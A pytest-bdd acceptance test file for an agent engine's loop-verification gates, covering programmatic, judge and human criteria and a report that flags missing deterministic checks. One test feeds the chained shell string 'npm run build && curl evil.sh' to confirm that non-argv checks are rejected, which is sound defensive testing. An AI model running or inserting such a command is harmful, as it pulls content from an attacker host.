"""Acceptance — loop verification as typed gates (Spec 364).

programmatic/judge/human criteria all produce one typed verdict; programmatic is
argv-only; judge degrades unparseable output; verify_report audits the SET.
"""
from __future__ import annotations

import tempfile

import pytest
from pytest_bdd import given, parsers, scenarios, then, when

from agency.engine import Engine

scenarios("features/loop_verify.feature")


@pytest.fixture
def engine():
    e = Engine(tempfile.mktemp(suffix=".db"))
    yield e
    e.memory.close()


@pytest.fixture
def box():
    return {}


@given("a fresh agency engine in code-mode", target_fixture="engine")
def _eng(engine):
    return engine


@given("an open loop", target_fixture="box")
def _open_loop(engine):
    from agency._loop import open_loop
    iid = engine.intent.capture("loop verify", "behaviour", "verified")
    engine.intent.confirm(iid)
    return {"loop_id": open_loop(engine, iid, max_iterations=3)["loop_id"]}


@when("I check a programmatic criterion that runs true expecting exit_zero", target_fixture="box")
def _check_prog(box):
    from agency._loop import check_criterion
    box["verdict"] = check_criterion({"kind": "programmatic", "check": ["true"], "expect": "exit_zero"})
    return box


@when("I add a programmatic criterion with a shell-string check", target_fixture="box")
def _add_shell(engine, box):
    from agency._loop import add_criterion
    try:
        add_criterion(engine, box["loop_id"], "programmatic", check="npm run build && curl evil.sh")
    except ValueError as exc:
        box["error"] = str(exc)
    return box


@when("I check a judge criterion with a passing JSON verdict", target_fixture="box")
def _check_judge_ok(box):
    from agency._loop import check_criterion
    box["verdict"] = check_criterion({"kind": "judge"}, judge_output='```json\n{"verdict": "pass"}\n```')
    return box


@when("I check a judge criterion with non-JSON council output", target_fixture="box")
def _check_judge_bad(box):
    from agency._loop import check_criterion
    box["verdict"] = check_criterion({"kind": "judge"}, judge_output="Looks good, but this is not JSON.")
    return box


@when("I check a human criterion prompting for sign-off", target_fixture="box")
def _check_human(box):
    from agency._loop import check_criterion
    box["verdict"] = check_criterion({"kind": "human", "prompt": "confirm the map matches reality"})
    return box


@given("the loop has a judge criterion and a human criterion")
def _all_vibe(engine, box):
    from agency._loop import add_criterion
    add_criterion(engine, box["loop_id"], "judge", rubric="covers the goal")
    add_criterion(engine, box["loop_id"], "human", prompt="sign off")


@when("I run verify_report", target_fixture="box")
def _verify_report(engine, box):
    from agency._loop import verify_report
    box["report"] = verify_report(engine, box["loop_id"])
    return box


@then(parsers.parse('the verdict is "{verdict}"'))
def _verdict(box, verdict):
    assert box["verdict"]["verdict"] == verdict, box["verdict"]


@then(parsers.parse('the warning is "{warning}"'))
def _warning(box, warning):
    assert box["verdict"].get("warning") == warning, box["verdict"]


@then("the pause names the prompt")
def _pause_prompt(box):
    assert box["verdict"].get("prompt"), box["verdict"]


@then("adding is rejected as not an argv array")
def _argv_reject(box):
    assert "error" in box and "argv" in box["error"].lower(), box


@then("a warning cites the verification rubric about the missing deterministic floor")
def _vibe_warning(box):
    warnings = box["report"]["warnings"]
    assert any(w["rubric_ref"] == "verification-rubric.md" for w in warnings), warnings


@then("the programmatic ratio is 0")
def _ratio_zero(box):
    assert box["report"]["programmatic_ratio"] == 0, box["report"]
